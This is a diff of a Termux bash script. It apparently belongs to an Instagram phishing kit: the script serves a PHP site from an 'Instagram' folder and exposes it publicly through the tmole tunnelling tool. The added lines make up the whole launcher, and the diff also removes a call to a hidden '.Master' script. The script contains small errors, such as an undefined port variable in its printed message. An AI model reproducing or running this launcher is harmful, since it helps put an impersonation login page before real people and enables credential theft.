@@ -1,2 +1,24 @@
-cd /data/data/com.termux/files/home/Instagram
-bash .Master
+#!/bin/bash
+
+# Color Codes
+white=$'\e[1;0m'
+red=$'\e[1;31m'
+green=$'\e[1;32m'
+yellow=$'\e[1;33m'
+blue=$'\e[1;34m'
+pink=$'\e[1;35m'
+#aqua
+A=$'\e[1;36m'
+White=$'\e[1;37m'
+
+
+	
+	printf "\n ${red}[${white}-${red}]${blue} Starting PHP Server on Port: ${yellow}${port}\n"
+	cd /data/data/com.termux/files/home/Instagram && php -S 127.0.0.1:8080 > /dev/null 2>&1 &
+	sleep 2
+	printf "\n ${red}[${white}-${red}]${green} Suessfully Hosted link:=> ${yellow}http://127.0.0.1:8080"
+	printf "\n\n ${red}[${white}-${red}]${A} Press Ctrl + C to exit. ${white}\n"
+	tmole 8080
+        while [ true ]; do
+		sleep 0.75
+	done
